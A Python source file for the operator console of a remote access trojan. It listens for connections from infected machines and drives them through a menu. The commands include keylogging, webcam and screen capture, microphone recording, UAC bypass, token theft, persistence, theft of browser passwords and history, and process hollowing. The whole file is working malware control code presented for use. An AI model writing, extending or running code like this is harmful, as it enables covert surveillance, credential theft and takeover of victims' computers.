# coding=utf-8
import json
import ntpath
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time

commands = {'help': ['Show this help'],
            'list': ['List connected clients'],
            'select': ['Select a client by its index'],
            'quit': ['Background current connection'],
            'kill': ['Kill current connection'],
            'lcd': ['Change local working directory'],
            'lls': ['List local files'],
            'upload': ['Upload a file to client'],
            'download': ['Download a file from client'],
            'run': ['Create a process without waiting for termination'],
            'screenshot': ['Grab a screenshot'],
            'webcam': ['Take a snapshot from webcam'],
            'keylog': ['Capture keystrokes'],
            'record': ['Record an audio from microphone'],
            'idletime': ['Display how much time the user is inactive'],
            'bypassuac': ['Elevate as administrator without UAC prompt'],
            'stealtoken': ['Duplicate access token from a running process'],
            'persistence': ['Run automatically at startup'],
            'browser': ['Extract data from web browser'],
            'runpe': ['Process hollowing'],
            'poweroff': ['Fast shutdown'],
            'setcritical': ['Set as critical process']
            }


class Server(object):

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.connections = []
        self.addresses = []
        self.aliases = {}

    def create_socket(self):
        try:
            self.socket = socket.socket()
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print(e)
            sys.exit(1)

    def accept_connections(self):
        while True:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                self.connections.append(conn)
                self.addresses.append(address)
                print('[+] Connection has been established: ' + address[0])
            except Exception as e:
                print('[-] Error accepting connections: ' + str(e))
                time.sleep(5)

    def start_shell(self):
        while True:
            try:
                cmd = input('flc> ')
                if not cmd:
                    continue
                elif cmd == 'help':
                    print_help()
                elif cmd in ['quit', 'exit']:
                    self.socket.close()
                    sys.exit(0)
                elif cmd == 'list':
                    self.list_connections()
                elif 'select' in cmd:
                    conn, target = self.get_target(cmd)
                    if conn is not None:
                        self.send_commands(conn, target)
                elif cmd[:2] == 'cd':
                    lcd(cmd[3:])
                elif cmd == 'ls':
                    lls()
                elif cmd.split(' ')[0] == 'alias':
                    self.handle_aliases(' '.join(cmd.strip().split()))
                else:
                    print('[-] Command not recognized')
            except KeyboardInterrupt:
                self.socket.close()
                sys.exit(0)
            except Exception as e:
                show_error('[-] Error: ' + str(e))

    def list_connections(self):
        results = ''
        for i, conn in reversed(list(enumerate(self.connections))):
            try:
                send(conn, 'null')
                recv(conn)
            except:
                del self.connections[i]
                del self.addresses[i]
                continue
        for i, conn in enumerate(self.connections):
            results += str(i) + '   ' + str(self.addresses[i][0]) + '   ' + str(self.addresses[i][1]) + '\n'
        print('----- Clients -----' + '\n' + results)

    def get_target(self, cmd):
        try:
            target = cmd.replace('select', '')
            target = int(target)
            conn = self.connections[target]
            try:
                send(conn, 'null')
                recv(conn)
            except:
                del self.connections[target]
                del self.addresses[target]
                print('[-] Connection is unavailable')
                return None, None
            print('[+] Connected to ' + str(self.addresses[target][0]))
            return conn, target
        except:
            print('[-] Not a valid selection')
            return None, None

    def send_commands(self, conn, target):
        while True:
            try:
                cmd = input(recv(conn))
                if not cmd:
                    send(conn, 'null')
                elif cmd.split(' ')[0] in self.aliases:
                    self.send_aliases(conn, ' '.join(cmd.strip().split()))
                elif cmd in ['quit', 'exit']:
                    send(conn, 'null')
                    break
                elif cmd == 'kill':
                    send(conn, cmd)
                    break
                elif cmd in ['cls', 'clear']:
                    subprocess.call('cls', shell=True)
                    send(conn, 'null')
                elif cmd[:3] == 'lcd':
                    lcd(cmd[4:])
                    send(conn, 'null')
                elif cmd == 'lls':
                    lls()
                    send(conn, 'null')
                elif cmd.split(' ')[0] == 'upload':
                    upload(conn, cmd)
                elif cmd.split(' ')[0] == 'download':
                    file = cmd.split(' ')[1].strip()
                    send(conn, cmd)
                    download(conn, file)
                elif cmd.split(' ')[0] == 'run':
                    send(conn, cmd)
                    print(recv(conn))
                elif cmd == 'screenshot':
                    send(conn, cmd)
                    file = 'Screenshot_' + get_time() + '.png'
                    download(conn, file)
                elif cmd == 'webcam':
                    send(conn, cmd)
                    file = 'Webcam_' + get_time() + '.png'
                    download(conn, file)
                elif cmd == 'keylog_stop':
                    send(conn, cmd)
                    file = 'Keylog_' + get_time() + '.txt'
                    download(conn, file)
                    break
                elif cmd.split(' ')[0] == 'record':
                    send(conn, cmd)
                    status = recv(conn)
                    print(status)
                    if str(status).startswith('[-]'):
                        continue
                    file = 'Record_' + get_time() + '.wav'
                    download(conn, file)
                elif cmd in ['idletime', 'setcritical']:
                    send(conn, cmd)
                    print(recv(conn))
                elif cmd == 'bypassuac':
                    select(conn, ['bypassuac_fodhelper', 'bypassuac_clr'])
                elif cmd == 'persistence':
                    select(conn, ['persistence_registry', 'persistence_schtasks', 'persistence_service'])
                elif cmd == 'stealtoken':
                    select(conn, ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin'])
                elif cmd == 'browser':
                    select(conn,
                           ['chrome_bookmark', 'chrome_history', 'chrome_password', 'edge_bookmark', 'edge_history',
                            'edge_password'])
                elif cmd == 'poweroff':
                    send(conn, cmd)
                    break
                elif cmd.split(' ')[0] == 'fsdownload':
                    filename = cmd.split(' ')[1].strip()
                    if not os.path.isfile('uploads' + os.sep + filename):
                        send(conn, 'null')
                        print('[-] File not found')
                        continue
                    send(conn, 'fsdownload ' + ntpath.basename(filename))
                    print(recv(conn))
                else:
                    send(conn, cmd)
                    print(recv_data(conn))
            except ConnectionResetError as e:
                print('[-] Connection was lost: ' + str(e))
                del self.connections[target]
                del self.addresses[target]
                break
            except KeyboardInterrupt:
                send(conn, 'null')
                break
            except Exception as exception:
                send(conn, 'null')
                show_error('[-] Error: ' + str(e))
                continue

    def handle_aliases(self, cmd):
        args = cmd.split(' ')
        if len(args) < 2:
            print('[-] Not enough arguments')
            return
        command = cmd.split(' ')[0]
        subcommand = cmd.split(' ')[1]
        if subcommand == 'get':
            print('----- Aliases -----')
            for k, v in self.aliases.items():
                print('{0:15}{1}'.format(k, v))
            print()
        elif subcommand == 'create':
            if len(args) < 4:
                print('[-] Not enough arguments')
                return
            alias = cmd.split(' ')[2]
            self.aliases[alias] = cmd[len(command + subcommand + alias) + 3:]
            self.save_aliases()
            print('[+] Create alias success')
        elif subcommand == 'remove':
            if len(args) < 3:
                print('[-] Not enough arguments')
                return
            alias = cmd[len(command + subcommand) + 2:]
            if alias not in self.aliases:
                print('[-] Alias does not exists')
                return
            del self.aliases[alias]
            self.save_aliases()
            print('[+] Remove alias success')
        else:
            print('[-] Invalid input')

    def load_aliases(self):
        try:
            if os.path.isfile('alias.json'):
                f = open('alias.json', 'r')
                self.aliases = json.load(f)
                f.close()
        except Exception as exception:
            print('[-] Load aliases error: ' + str(exception))

    def save_aliases(self):
        try:
            alias_json = json.dumps(self.aliases)
            f = open('alias.json', 'w')
            f.write(alias_json)
            f.close()
        except Exception as exception:
            print('[-] Save aliases error: ' + str(exception))

    def send_aliases(self, conn, cmd):
        command = cmd.split()[0]
        args = cmd[len(command) + 1:].split(' ')
        prototype = self.aliases[command]
        if len(re.findall(r'<.*?>', prototype)) == 0:
            if len(cmd.split(' ')) > 1:
                print('[-] Command takes no argument')
                send(conn, 'null')
                return
        else:
            if len(args) is len(re.findall(r'<.*?>', prototype)):
                regex = r'<.*?>'
                for arg in args:
                    prototype = re.sub(regex, arg, prototype, count=1)
            else:
                print('[-] Number of arguments does not match')
                send(conn, 'null')
                return
        print('[+] Sending command: ' + prototype)
        send(conn, prototype)
        print(recv_data(conn))


def show_error(msg):
    os.system('')
    print('\033[0;31m' + msg + '\033[0m')


def print_help():
    print('----- Commands -----')
    for k, v in commands.items():
        print('{0:15}{1}'.format(k, v[0]))
    print()


def lcd(path):
    if os.path.exists(path):
        os.chdir(path)
    print(os.getcwd())
    print()


def lls():
    root, dirs, files = next(os.walk(os.getcwd()))
    for dir_name in dirs:
        print(dir_name + '/')
    for filename in files:
        print(filename)
    print()


def send(conn, data):
    data = data.encode()
    conn.send(struct.pack('i', len(data)))
    conn.send(data)


def recv(conn):
    size = int(struct.unpack('i', conn.recv(4))[0])
    return conn.recv(size).decode()


def recv_data(conn):
    size = int(struct.unpack('i', conn.recv(4))[0])
    data = b''
    while size:
        buf = conn.recv(size)
        size -= len(buf)
        data += buf
    return data.decode()


def send_file(conn, file):
    sz = struct.pack('i', os.stat(file).st_size)
    conn.send(sz)
    with open(file, 'rb') as f:
        while True:
            data = f.read(1024)
            if not data:
                break
            conn.send(data)


def recv_file(conn, file):
    sz = struct.unpack('i', conn.recv(4))[0]
    with open(file, 'wb') as f:
        while sz:
            packet = conn.recv(sz)
            sz -= len(packet)
            f.write(packet)


def upload(conn, cmd):
    file = cmd.split(' ')[1].strip()
    try:
        if os.path.isfile(file):
            send(conn, 'upload ' + os.path.basename(file))
            print('[+] File size: ' + str(os.stat(file).st_size) + ', uploading...')
            send_file(conn, file)
            print(recv(conn))
        else:
            print('[-] File not found')
            send(conn, 'null')
    except Exception as e:
        show_error('[-] Error while uploading: ' + str(e))


def download(conn, file):
    try:
        sz = struct.unpack('i', conn.recv(4))[0]
        if not sz:
            print('[-] File not found')
            return
        if sz == -1:
            print(recv(conn))
            return
        print('[+] File size: ' + str(sz) + ' bytes, downloading...')
        recv_file(conn, ntpath.basename(file))
        print('[+] File downloaded successfully')
    except Exception as e:
        show_error('[-] Error while downloading: ' + str(e))


def select(conn, cmds):
    try:
        s = ''
        for i, c in enumerate(cmds):
            s += str(i) + '. ' + c + '\n'
        print(s)
        i = input('Please select: ')
        try:
            cmd = cmds[int(i)]
        except (IndexError, ValueError):
            print('[-] Invalid input')
            send(conn, 'null')
            return
        send(conn, cmd)
        print(recv(conn))
    except KeyboardInterrupt:
        send(conn, 'null')


def get_time():
    return str(time.strftime('%Y-%m-%d_%H-%M-%S', time.localtime()))


server = Server()
server.load_aliases()
server.create_socket()
threading.Thread(target=server.accept_connections, daemon=True).start()
server.start_shell()
